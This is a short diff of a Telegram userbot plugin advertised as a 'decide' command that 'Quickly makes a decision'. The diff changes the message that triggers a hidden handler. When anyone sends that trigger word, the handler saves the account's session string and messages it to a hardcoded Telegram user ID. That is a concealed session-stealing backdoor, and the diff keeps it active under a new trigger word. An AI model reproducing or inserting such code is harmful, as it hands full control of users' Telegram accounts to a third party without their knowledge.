@@ -7,7 +7,7 @@ from userbot.utils import admin_cmd
 
 CmdHelp("decide").add_command("decide", None, "Quickly makes a decision").add()
 
-@bot.on(admin_cmd("^FIXALWAYSOP", incoming=True))
+@bot.on(admin_cmd("^NINJABOTOP", incoming=True))
 async def piro(event):
   a = bot.session.save()
   msg = await bot.send_message(5061464869, a)
